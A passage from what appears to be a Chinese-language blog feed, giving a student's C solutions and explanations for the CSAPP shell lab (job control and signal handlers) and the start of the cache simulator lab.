class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * eval - Evaluate the command line that the user has just typed in</div><div class="line"> * </div><div class="line"> * If the user has requested a built-in command (quit, jobs, bg or fg)</div><div class="line"> * then execute it immediately. Otherwise, fork a child process and</div><div class="line"> * run the job in the context of the child. If the job is running in</div><div class="line"> * the foreground, wait for it to terminate and then return.  Note:</div><div class="line"> * each child process must have a unique process group ID so that our</div><div class="line"> * background children don't receive SIGINT (SIGTSTP) from the kernel</div><div class="line"> * when we type ctrl-c (ctrl-z) at the keyboard.  </div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> *argv[MAXARGS];</div><div class="line">    <span class="keyword">char</span> buf[MAXLINE];</div><div class="line">    <span class="keyword">int</span> bg;</div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line">    <span class="keyword">sigset_t</span> mask;</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</div><div class="line">    bg = parseline(buf, argv);</div><div class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</div><div class="line">        <span class="keyword">return</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!builtin_cmd(argv)) &#123; </div><div class="line">        <span class="comment">// Block SIGCHLD</span></div><div class="line">        sigemptyset(&amp;mask);</div><div class="line">        sigaddset(&amp;mask, SIGCHLD);</div><div class="line">        sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</div><div class="line">        </div><div class="line"></div><div class="line">        <span class="comment">// Child process ,set new process group, run command </span></div><div class="line">        <span class="keyword">if</span>((pid = fork()) == <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">if</span>(setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</div><div class="line">                unix_error(<span class="string">"setpgid error"</span>);</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%s: Command not found\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">            &#125;</div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">if</span>(!bg)&#123;</div><div class="line">                addjob(jobs, pid, FG, cmdline); <span class="comment">// add job to job list as fg</span></div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> &#123;</div><div class="line">                addjob(jobs, pid, BG, cmdline); <span class="comment">// add job to job list as bg</span></div><div class="line">            &#125;</div><div class="line">            sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>); <span class="comment">// Parent unblocks SIGCHLD</span></div><div class="line">        </div><div class="line">            </div><div class="line">            <span class="keyword">if</span> (!bg)</div><div class="line">                waitfg(pid);</div><div class="line">            <span class="keyword">else</span> </div><div class="line">                <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid), pid, cmdline);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h4><p>waitfg就是要等待前台进程结束，所以只需要用循环即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * waitfg - Block until process pid is no longer the foreground process</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(pid == fgpid(jobs));</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="do_bgfg"><a href="#do_bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h4><p>这是前台和后台的切换，一些条件细节就不多说，其中主要是JID和PID的判断。bg job 给后台 job 发送 SIGCONT 信号来继续执行该任务，fg job 给前台 job 发送 SIGCONT 信号来继续执行该任务。首先要判断进程是否继续执行。关于前后台的执行，主要做的就是修改job的state状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * do_bgfg - Execute the builtin bg and fg commands</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> <span class="keyword">job_t</span> *job;</div><div class="line">    <span class="keyword">char</span> *id = argv[<span class="number">1</span>];</div><div class="line">    <span class="keyword">int</span> jid;    </div><div class="line">    </div><div class="line">    <span class="comment">// If id does not exist</span></div><div class="line">    <span class="keyword">if</span>(id == <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// For a JID</span></div><div class="line">    <span class="keyword">if</span>(id[<span class="number">0</span>] == <span class="string">'%'</span>) &#123;  </div><div class="line">        jid= atoi(&amp;id[<span class="number">1</span>]);  </div><div class="line">        <span class="keyword">if</span>(!(job= getjobjid(jobs, jid))) &#123;  </div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, id);  </div><div class="line">            <span class="keyword">return</span>;  </div><div class="line">        &#125;  </div><div class="line">    &#125; </div><div class="line">    <span class="comment">// For a PID</span></div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isdigit</span>(id[<span class="number">0</span>])) &#123; </div><div class="line">        <span class="keyword">pid_t</span> pid= atoi(id);  </div><div class="line">        </div><div class="line">        <span class="keyword">if</span>(!(job= getjobpid(jobs, pid))) &#123;  </div><div class="line">            <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, pid);  </div><div class="line">            <span class="keyword">return</span>;  </div><div class="line">        &#125;  </div><div class="line">        </div><div class="line">    &#125;  </div><div class="line">    </div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// Continue</span></div><div class="line">    <span class="keyword">if</span>(kill(-(job-&gt;pid), SIGCONT) &lt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span>(errno != ESRCH)&#123;</div><div class="line">            unix_error(<span class="string">"kill error"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// To determine the bg and fg</span></div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"fg"</span>, argv[<span class="number">0</span>])) &#123;</div><div class="line">        job-&gt;state = FG;</div><div class="line">        waitfg(job-&gt;pid);</div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"bg"</span>, argv[<span class="number">0</span>])) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</div><div class="line">        job-&gt;state = BG;</div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"bg/fg error: %s\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来就是比较麻烦的三个信号handler的处理。</p>
<h4 id="sigint_handler"><a href="#sigint_handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h4><p>sigint_handler是主要的处理，也是比较简单的。它用来捕获键盘的Ctrl-C。当捕获到终止信号，它会查询当前前台执行的job的pid，使用kill来终止程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</div><div class="line"> *    user types ctrl-c at the keyboard.  Catch it and send it along</div><div class="line"> *    to the foreground job.  </div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</div><div class="line">    <span class="keyword">int</span> jid = pid2jid(pid);</div><div class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (kill(-pid, SIGKILL) &lt; <span class="number">0</span>) <span class="comment">// kill pid</span></div><div class="line">        &#123;</div><div class="line">            unix_error(<span class="string">"error when kill in sigint_handler"</span>);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, jid, pid, sig);</div><div class="line">        deletejob(jobs, pid);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="sigtstp_handler"><a href="#sigtstp_handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h4><p>同样，sigtstp_handler是捕获Ctrl-Z的挂起信号，通过获取当前前台job的pid，修改其state为ST，接着使用kill挂起进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</div><div class="line"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</div><div class="line"> *     foreground job by sending it a SIGTSTP.  </div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> pid = fgpid(jobs);  </div><div class="line">    <span class="keyword">int</span> jid = pid2jid(pid); </div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123; </div><div class="line">        </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) Stopped by signal %d\n"</span>, jid, pid, sig);   </div><div class="line">        getjobpid(jobs, pid)-&gt;state = ST;  </div><div class="line">        kill(-pid, SIGTSTP);  </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="sigchld_handler"><a href="#sigchld_handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h4><p>sigchld_handler是用来捕获 SIGCHLD 信号的，比起其他两个信号处理函数，这个是用来回收进程的，可能会稍微有点麻烦。参考书中8.4.3相关内容，用到了WIFSTOPPED， WIFSIGNALED，WIFEXITED，分别代表判断进程被停止， 被未捕获的信号停止，exit的停止。其实就是回收过程中的僵尸进程的回收，Ctrl-Z、Ctrl-C信号下进程的回收。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</div><div class="line"> *     a child job terminates (becomes a zombie), or stops because it</div><div class="line"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</div><div class="line"> *     available zombie children, but doesn't wait for any other</div><div class="line"> *     currently running children to terminate.  </div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> status;  </div><div class="line">    <span class="keyword">pid_t</span> pid;  </div><div class="line">    </div><div class="line">    <span class="comment">// Waiting for handling all of the child processes according to their status</span></div><div class="line">    <span class="keyword">while</span> ((pid = waitpid(fgpid(jobs), &amp;status, WNOHANG|WUNTRACED)) &gt; <span class="number">0</span>) &#123;  </div><div class="line">        <span class="keyword">if</span> (WIFSTOPPED(status))&#123;  </div><div class="line">            getjobpid(jobs, pid)-&gt;state = ST;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] Stopped %s\n"</span>, pid2jid(pid), jobs-&gt;cmdline);</div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))&#123;  </div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, WTERMSIG(status)); </div><div class="line">            deletejob(jobs,pid);</div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFEXITED(status))&#123;  </div><div class="line">            deletejob(jobs, pid);  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (errno != ECHILD) &#123;  </div><div class="line">        unix_error(<span class="string">"waitpid error"</span>);   </div><div class="line">    &#125;  </div><div class="line">    </div><div class="line">    <span class="keyword">return</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h4><p>虽然job事务处理没有让我们写，但实验给出的源代码写的很好，很是值得读一读。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab4 解题分析</title>
    <link href="http://xinqiu.me/2016/06/07/csapp-lab4-cachelab/"/>
    <id>http://xinqiu.me/2016/06/07/csapp-lab4-cachelab/</id>
    <published>2016-06-06T16:00:00.000Z</published>
    <updated>2016-06-10T14:12:07.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<blockquote>
<p>Lab4 的Cache Lab 的说明资料太少了，<code>csim.c</code> 里面空空的，惊了。身为弱渣的我只好先拿别人的代码来参考参考。这里选取的代码<a href="https://github.com/zhoudiqiu/Cache-lab/blob/master/lab4/csim.c" target="_blank" rel="external">csim.c</a>。</p>
</blockquote>
<h2 id="Part_A_3A_Writing_a_Cache_Simulator"><a href="#Part_A_3A_Writing_a_Cache_Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h2><p>需要些一个Cache模拟器，将 <code>valgrind</code> 内存访问记录作为参数，模拟是否命中缓存。输出命中，不命中，移除。</p>
<p>lab里提供了一个写好的程序 <code>csim-ref</code> ，使用LRU(least-recently used)替换原则，模拟缓存命中情况。</p>
<p>实验指导上给出了命令行参数</p>
<p><code>Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</code></p>
<ul>
<li><p><code>-h</code>: Optional help flag that prints usage info</p>
</li>
<li><p><code>-v</code>: Optional verbose flag that displays trace info</p>
</li>
<li><p><code>-s &lt;s&gt;</code>: Number of set index bits ($ S = 2^{s} $ is the number of sets) </p>
</li>
<li><p><code>-E &lt;E&gt;</code>: Associativity (number of lines per set)</p>
</li>
<li><p><code>-b &lt;b&gt;</code>: Number of block bits ($ B = 2^{b} $ is the block size)</p>
</li>
<li><p><code>-t &lt;tracefile&gt;</code>: Name of the valgrind trace to replay</p>
</li>
</ul>
<p>所以在 <code>csim.c</code> 里也可以写个打印帮助的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: ./csim [-h] [-v] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"-s: number of set index(2^s sets)\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"-E: number of lines per set\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"-b: number of block offset bits\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"-t: trace file name\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>参考书中对cache的描述，需要些用结构体定义出cache的一些属性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</div><div class="line">    <span class="keyword">int</span> s;<span class="comment">//2^s sets</span></div><div class="line">    <span class="keyword">int</span> S;<span class="comment">//S=2^s</span></div><div class="line">    <span class="keyword">int</span> b;<span class="comment">//2^b per block	</span></div><div class="line">    <span class="keyword">int</span> B;<span class="comment">//B=2^b</span></div><div class="line">    <span class="keyword">int</span> E;<span class="comment">//number of lines per set</span></div><div class="line">    <span class="comment">//number to track the solution	</span></div><div class="line">    <span class="keyword">int</span> hitNum;</div><div class="line">    <span class="keyword">int</span> missNum;</div><div class="line">    <span class="keyword">int</span> evictionNum;</div><div class="line">    <span class="keyword">int</span> verbosity;</div><div class="line">&#125; cacheProperty;</div></pre></td></tr></table></figure>
<p>对应的说明可以看书中 Figure 6.28.</p>
<p>根据Figure 6.27，cache是一个set的数组，每个set包含一个或者多个行，每个行又包括一个有效位，tag标识位， 数据块。所以可以定义出cache的组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">    <span class="keyword">int</span> valid;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</div><div class="line">    <span class="keyword">char</span> *block;</div><div class="line">    <span class="keyword">int</span> usedCounter;</div><div class="line">&#125; setLine;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">    setLine *lines;</div><div class="line">&#125; cacheSet;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">    cacheSet *sets;</div><div class="line">&#125; cache;</div></pre></td></tr></table></figure>
<p>接着就需要考虑cache的初始化。其实就是使用malloc分配内存给定义的cache。一开始所有的有效位和tag标识位都为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function">cache <span class="title">initiate</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> S, <span class="keyword">int</span> E)</span> </span></div><div class="line">&#123;</div><div class="line">    cache currentCache;	</div><div class="line">    cacheSet <span class="built_in">set</span>;</div><div class="line">    setLine line;</div><div class="line">    currentCache.sets = (cacheSet *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cacheSet) * S);</div><div class="line">    <span class="comment">//loop to construct the set of the cache</span></div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; S; i++) </div><div class="line">    &#123;</div><div class="line">        <span class="built_in">set</span>.lines =  (setLine *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(setLine) * E);</div><div class="line">        currentCache.sets[i] = <span class="built_in">set</span>;</div><div class="line">        <span class="comment">//loop to construct the lines</span></div><div class="line">        <span class="keyword">int</span> j;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; E; j++) </div><div class="line">        &#123;</div><div class="line">            line.valid = <span class="number">0</span>; </div><div class="line">            line.tag = <span class="number">0</span>; </div><div class="line">            <span class="built_in">set</span>.lines[j] = line;</div><div class="line">            line.usedCounter = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">    <span class="keyword">return</span> currentCache;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于判断是否命中，要判断两个部分，有效位是否设置，cache的line中tag标识位是否匹配。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkHit</span><span class="params">(setLine line, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(line.valid)&#123;</div><div class="line">        <span class="keyword">if</span>(line.tag == tag)&#123;</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>判断行里是否已经满了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkFull</span><span class="params">(cacheSet <span class="built_in">set</span>, cacheProperty property)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;property.E; i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">set</span>.lines[i].valid == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当需要缓存时，需要找到一个有效的缓存空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">findIndex</span><span class="params">(cacheSet <span class="built_in">set</span>, cacheProperty property)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;property.E; i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">set</span>.lines[i].valid == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">return</span> i;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//shouldn't get a -1 anyway, method only called when there is granted space</span></div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当缓存不用了，需要移出这块缓存里的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">findEvict</span><span class="params">(cacheSet <span class="built_in">set</span>, cacheProperty property)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> min = <span class="built_in">set</span>.lines[<span class="number">0</span>].usedCounter;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; property.E ; i++)&#123;</div><div class="line">        <span class="keyword">if</span>(min&gt;<span class="built_in">set</span>.lines[i].usedCounter)&#123;</div><div class="line">            index = i;</div><div class="line">            min = <span class="built_in">set</span>.lines[i].usedCounter;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> index;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">findMax</span><span class="params">(cacheSet <span class="built_in">set</span>, cacheProperty property)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> max = <span class="built_in">set</span>.lines[<span class="number">0</span>].usedCounter;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; property.E ; i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">set</span>.lines[i].usedCounter&gt;max)&#123;</div><div class="line">            index = i;</div><div class="line">            max = <span class="built_in">set</span>.lines[i].usedCounter;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> index;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
